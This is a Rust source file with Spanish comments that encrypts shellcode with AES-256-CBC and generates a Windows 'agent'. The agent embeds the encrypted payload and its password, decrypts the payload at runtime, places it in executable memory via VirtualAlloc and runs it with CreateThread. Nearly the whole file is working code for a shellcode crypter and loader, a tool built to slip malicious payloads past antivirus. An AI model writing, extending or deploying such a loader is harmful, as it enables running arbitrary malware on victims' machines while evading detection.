// File: src/encrypt.rs
// Función para encriptar shellcode en AES-256-CBC

extern crate aes;
extern crate cbc;
extern crate pbkdf2;
extern crate sha2;
extern crate hex;
extern crate hmac;
extern crate rand;

use aes::Aes256;
use cbc::{Encryptor, Decryptor};
use cbc::cipher::{BlockEncryptMut, BlockDecryptMut, KeyIvInit};
use pbkdf2::{pbkdf2};
use sha2::Sha256;
use hmac::Hmac;
use rand::RngCore;
use std::fs::File;
use std::io::{Read, Write};

pub fn encrypt_shellcode(shellcode: &[u8], password: &str, salt: &[u8]) -> (Vec<u8>, [u8; 32], [u8; 16]) {
    // Derivar la clave usando PBKDF2
    let mut key = [0u8; 32]; // AES-256 requiere una clave de 32 bytes
    pbkdf2::<Hmac<Sha256>>(password.as_bytes(), salt, 10000, &mut key);

    // Vector de inicialización (IV) aleatorio
    let mut iv = [0u8; 16];
    rand::thread_rng().fill_bytes(&mut iv);

    // Crear el cifrador AES-256-CBC
    let mut buffer = shellcode.to_vec();
    let cipher = Encryptor::<Aes256>::new(&key.into(), &iv.into());
    
    // Encriptar el shellcode
    // Pad the buffer to block size
    let block_size = 16;
    let padding_len = block_size - (buffer.len() % block_size);
    buffer.extend(vec![padding_len as u8; padding_len]);
    
    let buffer_len = buffer.len();
    let ciphertext = cipher.encrypt_padded_mut::<cbc::cipher::block_padding::Pkcs7>(&mut buffer, buffer_len).unwrap();
    
    // Retornar el texto cifrado, la clave derivada y el IV
    (ciphertext.to_vec(), key, iv)
}

pub fn decrypt_shellcode(ciphertext: &[u8], password: &str, salt: &[u8], iv: &[u8; 16]) -> Vec<u8> {
    // Derivar la clave usando PBKDF2
    let mut key = [0u8; 32];
    pbkdf2::<Hmac<Sha256>>(password.as_bytes(), salt, 10000, &mut key);

    // Crear el descifrador AES-256-CBC
    let cipher = Decryptor::<Aes256>::new(&key.into(), iv.into());

    // Desencriptar el shellcode
    let mut buffer = ciphertext.to_vec();
    let decrypted_data = cipher.decrypt_padded_mut::<cbc::cipher::block_padding::Pkcs7>(&mut buffer).unwrap();
    
    decrypted_data.to_vec()
}

pub fn generate_agent(shellcode_file: &str, password: &str, output_name: &str) -> Result<(), Box<dyn std::error::Error>> {
    // Leer el archivo de shellcode
    let mut file = File::open(shellcode_file)?;
    let mut shellcode = Vec::new();
    file.read_to_end(&mut shellcode)?;

    // Generar salt aleatorio
    let mut salt = [0u8; 16];
    rand::thread_rng().fill_bytes(&mut salt);

    // Encriptar el shellcode
    let (encrypted_data, _key, iv) = encrypt_shellcode(&shellcode, password, &salt);

    // Crear el código del agente con los datos encriptados embebidos
    let agent_code = format!(r#"extern crate aes;
extern crate cbc;
extern crate pbkdf2;
extern crate sha2;
extern crate hmac;

use aes::Aes256;
use cbc::{{Encryptor, Decryptor}};
use cbc::cipher::{{BlockEncryptMut, BlockDecryptMut, KeyIvInit}};
use pbkdf2::pbkdf2;
use sha2::Sha256;
use hmac::Hmac;
use std::mem::transmute;
use std::ptr::copy;
use winapi::um::winnt::{{PAGE_EXECUTE_READWRITE, MEM_COMMIT, MEM_RESERVE}};
use winapi::um::memoryapi::VirtualAlloc;
use winapi::um::processthreadsapi::{{CreateThread, WaitForSingleObject}};
use winapi::um::winbase::INFINITE;

// Datos encriptados embebidos
const ENCRYPTED_SHELLCODE: &[u8] = &{:?};
const SALT: &[u8] = &{:?};
const IV: &[u8] = &{:?};
const PASSWORD: &str = "{}";

fn main() {{
    unsafe {{
        // Derivar la clave
        let mut key = [0u8; 32];
        pbkdf2::<Hmac<Sha256>>(PASSWORD.as_bytes(), SALT, 10000, &mut key);
        
        // Desencriptar shellcode
        let cipher = Decryptor::<Aes256>::new(&key.into(), &IV.into());
        let mut encrypted_data = ENCRYPTED_SHELLCODE.to_vec();
        let shellcode = cipher.decrypt_padded_vec_mut::<cbc::cipher::block_padding::Pkcs7>(&mut encrypted_data).unwrap();
        
        // Asignar memoria ejecutable
        let mem = VirtualAlloc(
            std::ptr::null_mut(),
            shellcode.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        );
        
        if mem.is_null() {{
            return;
        }}
        
        // Copiar shellcode a memoria
        copy(shellcode.as_ptr(), mem as *mut u8, shellcode.len());
        
        // Crear thread y ejecutar
        let func: extern "system" fn() -> u32 = transmute(mem);
        let thread = CreateThread(
            std::ptr::null_mut(),
            0,
            Some(transmute(func as *const ())),
            std::ptr::null_mut(),
            0,
            std::ptr::null_mut(),
        );
        
        if !thread.is_null() {{
            WaitForSingleObject(thread, INFINITE);
        }}
    }}
}}
"#, 
        encrypted_data, 
        salt.to_vec(), 
        iv.to_vec(), 
        password
    );

    // Escribir el archivo del agente
    let agent_file = format!("{}.rs", output_name);
    let mut output_file = File::create(&agent_file)?;
    output_file.write_all(agent_code.as_bytes())?;

    println!("✅ Agente generado: {}", agent_file);
    println!("📝 Para compilar: rustc {} -o {}.exe", agent_file, output_name);
    
    Ok(())
}